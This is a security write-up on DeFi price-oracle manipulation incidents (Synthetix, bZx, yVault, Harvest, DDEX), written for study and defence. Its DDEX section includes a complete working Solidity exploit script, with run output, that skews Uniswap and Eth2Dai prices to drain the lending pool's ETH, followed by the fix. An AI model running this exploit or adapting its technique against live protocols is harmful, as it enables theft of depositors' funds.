# Rekt

## Synthetix sKRW Oracle Malfunction

Synthetix is a derivatives platform which allows users to be exposed to assets such as other currencies. To facilitate this, **Synthetix \(at the time\) relied on a custom off-chain price feed implementation wherein an aggregate price calculated from a secret set of price feeds was posted on-chain at a fixed interval.** These prices then allowed users to take long or short positions against supported assets.

On June 25, 2019, one of the price feeds that Synthetix relied on mis-reported the price of the Korean Won to be 1000x higher than the true rate. Due to [additional errors](https://blog.synthetix.io/response-to-oracle-incident/) elsewhere in the price oracle system, this price was accepted by the system and posted on-chain, where **a trading bot quickly traded in and out of the sKRW market.** In total, the bot was able to earn a profit of over 1B USD, although the Synthetix team was able to negotiate with the trader to return the funds in exchange for a bug bounty.

Synthetix correctly implemented the oracle contract and pulled prices from multiple sources in order to prevent traders from predicting price changes before they were published on-chain. However, an isolated case of one upstream price feed malfunctioning resulted in a devastating attack. This illustrates the risk of using a price oracle which uses off-chain data: you don't know how the price is calculated, so your system must be carefully designed such that all potential failure modes are handled properly.

##  Synthetix MKR Manipulation

In December 2019, Synthetix suffered another attack as a result of price oracle manipulation. What’s notable about this one is that it crossed the barrier between on-chain price data and off-chain price data.

Reddit user u/MusaTheRedGuard [observed](https://www.reddit.com/r/ethfinance/comments/eexbfa/daily_general_discussion_december_24_2019/fby3i6n/) that an attacker was making some very suspicious trades against sMKR and iMKR \(inverse MKR\). The attacker first purchased a long position on MKR by buying sMKR, then purchased large quantities of MKR from the Uniswap ETH/MKR pair. After waiting a while, the attacker sold their sMKR for iMKR and sold their MKR back to Uniswap. They then repeated this process.

Behind the scenes, the attacker’s trades through Uniswap allowed them to move the price of MKR on Synthetix at will. This was likely because **the off-chain price feed that Synthetix relied on was in fact relying on the on-chain price of MKR,** and there wasn’t enough liquidity for arbitrageurs to reset the market back to optimal conditions.

![](../../.gitbook/assets/image%20%289%29.png)

This incident illustrates the fact that even if you think you’re using off-chain price data, you may still actually be using on-chain price data and you may still be exposed to the intricacies involved with using that data.

## bZx Second Hack

By relying on an on-chain decentralized price oracle without validating the rates returned, [DDEX](https://margin.ddex.io/) and [bZx](https://bzx.network/) were susceptible to atomic price manipulation. This would have resulted in the loss of liquid ETH in the ETH/DAI market for DDEX, and loss of all liquid funds in bZx. Fortunately, no funds were actually lost.

In February 2020, bZx was hacked twice over the span of several days for approximately 1MM USD. You can find an excellent technical analysis of both hacks written by palkeo [here](https://www.palkeo.com/en/projets/ethereum/bzx.html), but we will only be looking at the second hack.

In the second hack, the attacker first purchased nearly all of the sUSD on Kyber using ETH. Then, the attacker purchased a second batch of sUSD from Synthetix itself and deposited it on bZx. Using the sUSD as collateral, the attacker borrowed the maximum amount of ETH they were allowed to. They then sold back the sUSD to Kyber.

If you’ve been paying attention, you’ll recognize this as essentially the same undercollateralized loan attack, but using a different collateral and a different decentralized exchange.

## yVault Bug

On July 25, 2020, I reported a bug to yEarn regarding the launch of their new yVault contracts. You can read the official writeup about this bug [here](https://blog.trailofbits.com/2020/08/05/accidentally-stepping-on-a-defi-lego/), but I will briefly summarize it below.

The yVault system allows users to deposit a token and earn yield on it without needing to manage it themselves. Internally, the vault tracks the total amount of yVault tokens minted as well as the total amount of underlying tokens deposited. **The worth of a single yVault token is given by the ratio of tokens minted to tokens deposited.** Any yield the vault earns is spread across all minted yVault tokens \(and therefore, across all yVault token holders\).

The first yVault allowed users to earn yield on USDC by supplying liquidity to the Balancer MUSD/USDC pool. When a user supplies liquidity to Balancer pools, they receive BPT in return which can be redeemed for a proportion of the pool. As such, **the yVault calculated the value of its holdings based on the amount of MUSD/USDC which could be redeemed with its BPT.**

This seems like the correct implementation, but unfortunately the same principle as given before applies - **the state of the Balancer pool during a transaction is not stable and cannot be trusted**. In this case, because of the bonding curve that Balancer chose, a user who swaps between from USDC to MUSD will not receive a 1:1 exchange rate, but will in fact leave behind some MUSD in the pool. This means that the value of BPT can be temporarily inflated, which allows an attacker to manipulate the price at will and subsequently drain the vault.

![](https://samczsun.com/content/images/2020/11/image-30.png)

This incident shows that price oracles are not always conveniently labelled as such, and that developers need to be vigilant about what sort of data they’re ingesting and consider whether that data can be easily manipulated by an unprivileged user.

## Harvest Finance Hack

On October 26, 2020, an unknown user hacked the Harvest Finance pools using a technique that you can probably guess by now. You can read the official post-mortem [here](https://medium.com/harvest-finance/harvest-flashloan-economic-attack-post-mortem-3cf900d65217), but once again I’ll summarize it for you: **the attacker deflated the price of USDC in the Curve pool by performing a trade, entered the Harvest pool at the reduced price, restored the price by reversing the earlier trade, and exited the Harvest pool at a higher price. This resulted in over 33MM USD of losses**

\*\*\*\*

## DDEX \(Hydro Protocol\) <a id="ddex-hydro-protocol-"></a>

DDEX is a decentralized exchange platform but are in the process of expanding into decentralized lending so that they can offer their users the ability to create leveraged long and short positions. They're currently beta testing their decentralized margin exchange.

On September 9th 2019, DDEX added DAI as an asset to their margin trading platform and enabled the ETH/DAI market. For the oracle, they specified [this](https://etherscan.io/address/0xeB1f1A285fee2AB60D2910F2786E1D036E09EAA8) smart contract which returns the value of DAI/USD by calculating `PriceOfETHInUSD/PriceOfETHInDAI`. The value of ETH/USD is read from the Maker oracle, while the value of ETH/DAI is read from either Eth2Dai, or if the spread is too great, Uniswap.

```javascript
function peek()
	public
	view
	returns (uint256 _price)
{
	uint256 makerDaoPrice = getMakerDaoPrice();

	if (makerDaoPrice == 0) {
		return _price;
	}

	uint256 eth2daiPrice = getEth2DaiPrice();

	if (eth2daiPrice > 0) {
		_price = makerDaoPrice.mul(ONE).div(eth2daiPrice);
		return _price;
	}

	uint256 uniswapPrice = getUniswapPrice();

	if (uniswapPrice > 0) {
		_price = makerDaoPrice.mul(ONE).div(uniswapPrice);
		return _price;
	}

	return _price;
}

function getEth2DaiPrice()
	public
	view
	returns (uint256)
{
	if (Eth2Dai.isClosed() || !Eth2Dai.buyEnabled() || !Eth2Dai.matchingEnabled()) {
		return 0;
	}

	uint256 bidDai = Eth2Dai.getBuyAmount(address(DAI), WETH, eth2daiETHAmount);
	uint256 askDai = Eth2Dai.getPayAmount(address(DAI), WETH, eth2daiETHAmount);

	uint256 bidPrice = bidDai.mul(ONE).div(eth2daiETHAmount);
	uint256 askPrice = askDai.mul(ONE).div(eth2daiETHAmount);

	uint256 spread = askPrice.mul(ONE).div(bidPrice).sub(ONE);

	if (spread > eth2daiMaxSpread) {
		return 0;
	} else {
		return bidPrice.add(askPrice).div(2);
	}
}

function getUniswapPrice()
	public
	view
	returns (uint256)
{
	uint256 ethAmount = UNISWAP.balance;
	uint256 daiAmount = DAI.balanceOf(UNISWAP);
	uint256 uniswapPrice = daiAmount.mul(10**18).div(ethAmount);

	if (ethAmount < uniswapMinETHAmount) {
		return 0;
	} else {
		return uniswapPrice;
	}
}

function getMakerDaoPrice()
	public
	view
	returns (uint256)
{
	(bytes32 value, bool has) = makerDaoOracle.peek();

	if (has) {
		return uint256(value);
	} else {
		return 0;
	}
}
```

[Source](https://github.com/HydroProtocol/protocol/blob/244b01ad323a7d0796ae2eda3b7b455a361dd376/contracts/oracle/DaiPriceOracle.sol#L89-L155)

In order to trigger an update and cause the oracle to refresh its stored value, a user simply has to call `updatePrice()`.

```javascript
function updatePrice()
	public
	returns (bool)
{
	uint256 _price = peek();

	if (_price != 0) {
		price = _price;
		emit UpdatePrice(price);
		return true;
	} else {
		return false;
	}
}
```

[Source](https://github.com/HydroProtocol/protocol/blob/244b01ad323a7d0796ae2eda3b7b455a361dd376/contracts/oracle/DaiPriceOracle.sol#L74-L87)

### The attack

Let's assume we can manipulate the apparent value of DAI/USD. If this is the case, we would like to use this to borrow all of the ETH in the system while providing as little DAI as possible. To achieve this, we can either lower the apparent value of ETH/USD or increase the apparent value of DAI/USD. Since we're already assuming that the apparent value of DAI/USD is manipulable, we'll choose the latter.

To increase the apparent value DAI/USD, we can either increase the apparent value of ETH/USD, or decrease the apparent value of ETH/DAI. For all intents and purposes manipulating Maker's oracle is impossible, so we'll try decreasing the apparent value of ETH/DAI.

The oracle will calculate the value of ETH/DAI as reported by Eth2Dai by taking the average of the current asking price and the current bidding price. In order to decrease this value, we'll need to lower the current bidding price by filling existing orders and then lower the current asking price by placing new orders.

However, this requires a significant initial investment \(as we need to fill orders then make an equivalent number of orders\) and is non-trivial to implement. On the other hand, we can drop the Uniswap price simply by selling a large amount of DAI to Uniswap. As such, we'll aim to bypass the Eth2Dai logic and manipulate the Uniswap price.

In order to bypass Eth2Dai, we need to manipulate the magnitude of the spread. We can do this in one of two ways:

1. Clear out one side of the orderbook while leaving the other alone. This causes spread to increase positively
2. Force a crossed orderbook by listing an extreme buy or sell order. This causes spread to decrease negatively.

While option 2 would result in no losses from taking unfavorable orders, the use of SafeMath disallows a crossed orderbook and as such is unavailable to us. Instead, we'll force a large positive spread by clearing out one side of the orderbook. This will cause the DAI oracle to fallback to Uniswap to determine the price of DAI. Then, we can cause the Uniswap price of DAI/ETH to drop by buying a large amount of DAI. Once the apparent value of DAI/USD has been manipulated, it's trivial to take out a loan like as usual.

#### Demo <a id="demo"></a>

The following script will turn a profit of approximately 70 ETH by:

1. Clearing out Eth2Dai's sell orders until the spread is large enough that the oracle rejects the price
2. Buying more DAI from Uniswap, dropping the price from 213DAI/ETH to 13DAI/ETH
3. Borrowing all the available ETH \(~120\) for a small amount of DAI \(~2500\)
4. Selling the DAI we bought from Uniswap back to Uniswap
5. Selling the DAI we bought from Eth2Dai back to Eth2Dai
6. Resetting the oracle \(don't want anyone else abusing our favorable rates\)

```javascript
contract DDEXExploit is Script, Constants, TokenHelper {
    OracleLike private constant ETH_ORACLE = OracleLike(0x8984F1CFf1d614a7404b0cfE97C6fa9110b93Bd2);
    DaiOracleLike private constant DAI_ORACLE = DaiOracleLike(0xeB1f1A285fee2AB60D2910F2786E1D036E09EAA8);
    
    ERC20Like private constant HYDRO_ETH = ERC20Like(0x000000000000000000000000000000000000000E);
    HydroLike private constant HYDRO = HydroLike(0x241e82C79452F51fbfc89Fac6d912e021dB1a3B7);
    
    uint16 private constant ETHDAI_MARKET_ID = 1;
    
    uint private constant INITIAL_BALANCE = 25000 ether;
    
    function setup() public {
        name("ddex-exploit");
        blockNumber(8572000);
    }
    
    function run() public {
        begin("exploit")
            .withBalance(INITIAL_BALANCE)
            .first(this.checkRates)
            .then(this.skewRates)
            .then(this.checkRates)
            .then(this.steal)
            .then(this.cleanup)
            .then(this.checkProfits);
    }
    
    function checkRates() external {
        uint ethPrice = ETH_ORACLE.getPrice(HYDRO_ETH);
        uint daiPrice = DAI_ORACLE.getPrice(DAI);
        
        printf("eth=%.18u dai=%.18u\n", abi.encode(ethPrice, daiPrice));
    }
    
    uint private boughtFromMatchingMarket = 0;
    
    function skewRates() external {
        skewUniswapPrice();
        skewMatchingMarket();
        require(DAI_ORACLE.updatePrice());
    }
    
    function skewUniswapPrice() internal {
        DAI.getFromUniswap(DAI.balanceOf(address(DAI.getUniswapExchange())) * 75 / 100);
    }
    
    function skewMatchingMarket() internal {
        uint start = DAI.balanceOf(address(this));
        WETH.deposit.value(address(this).balance)();
        WETH.approve(address(MATCHING_MARKET), uint(-1));
        while (DAI_ORACLE.getEth2DaiPrice() != 0) {
            MATCHING_MARKET.buyAllAmount(DAI, 5000 ether, WETH, uint(-1));
        }
        boughtFromMatchingMarket = DAI.balanceOf(address(this)) - start;
        WETH.withdrawAll();
    }
    
    function steal() external {
        HydroLike.Market memory ethDaiMarket = HYDRO.getMarket(ETHDAI_MARKET_ID);
        HydroLike.BalancePath memory commonPath = HydroLike.BalancePath({
            category: HydroLike.BalanceCategory.Common,
            marketID: 0,
            user: address(this)
        });
        HydroLike.BalancePath memory ethDaiPath = HydroLike.BalancePath({
            category: HydroLike.BalanceCategory.CollateralAccount,
            marketID: 1,
            user: address(this)
        });
        
        uint ethWanted = HYDRO.getPoolCashableAmount(HYDRO_ETH);
        uint daiRequired = ETH_ORACLE.getPrice(HYDRO_ETH) * ethWanted * ethDaiMarket.withdrawRate / DAI_ORACLE.getPrice(DAI) / 1 ether + 1 ether;
        
        printf("ethWanted=%.18u daiNeeded=%.18u\n", abi.encode(ethWanted, daiRequired));
        
        HydroLike.Action[] memory actions = new HydroLike.Action[](5);
        actions[0] = HydroLike.Action({
            actionType: HydroLike.ActionType.Deposit,
            encodedParams: abi.encode(address(DAI), uint(daiRequired))
        });
        actions[1] = HydroLike.Action({
            actionType: HydroLike.ActionType.Transfer,
            encodedParams: abi.encode(address(DAI), commonPath, ethDaiPath, uint(daiRequired))
        });
        actions[2] = HydroLike.Action({
            actionType: HydroLike.ActionType.Borrow,
            encodedParams: abi.encode(uint16(ETHDAI_MARKET_ID), address(HYDRO_ETH), uint(ethWanted))
        });
        actions[3] = HydroLike.Action({
            actionType: HydroLike.ActionType.Transfer,
            encodedParams: abi.encode(address(HYDRO_ETH), ethDaiPath, commonPath, uint(ethWanted))
        });
        actions[4] = HydroLike.Action({
            actionType: HydroLike.ActionType.Withdraw,
            encodedParams: abi.encode(address(HYDRO_ETH), uint(ethWanted))
        });
        DAI.approve(address(HYDRO), daiRequired);
        HYDRO.batch(actions);
    }
    
    function cleanup() external {
        DAI.approve(address(MATCHING_MARKET), uint(-1));
        MATCHING_MARKET.sellAllAmount(DAI, boughtFromMatchingMarket, WETH, uint(0));
        WETH.withdrawAll();
        
        DAI.giveAllToUniswap();
        require(DAI_ORACLE.updatePrice());
    }
    
    function checkProfits() external {
        printf("profits=%.18u\n", abi.encode(address(this).balance - INITIAL_BALANCE));
    }
}

/*
### running script "ddex-exploit" at block 8572000
#### executing step: exploit
##### calling: checkRates()
eth=213.440000000000000000 dai=1.003140638067989051
##### calling: skewRates()
##### calling: checkRates()
eth=213.440000000000000000 dai=16.058419875880325580
##### calling: steal()
ethWanted=122.103009983203364425 daiNeeded=2435.392672403537525078
##### calling: cleanup()
##### calling: checkProfits()
profits=72.140629996890984407
#### finished executing step: exploit
*/
```

#### Solution <a id="solution"></a>

The DDEX team fixed this by deploying a [new oracle](https://etherscan.io/address/0xe6f148448b61339a59ef6ab9ab7378e9200fa745) which places sanity bounds on the price of DAI, currently set to `0.95` and `1.05`.

```javascript
function updatePrice()
	public
	returns (bool)
{
	uint256 _price = peek();

	if (_price == 0) {
		return false;
	}

	if (_price == price) {
		return true;
	}

	if (_price > maxPrice) {
		_price = maxPrice;
	} else if (_price < minPrice) {
		_price = minPrice;
	}

	price = _price;
	emit UpdatePrice(price);

	return true;
}
```

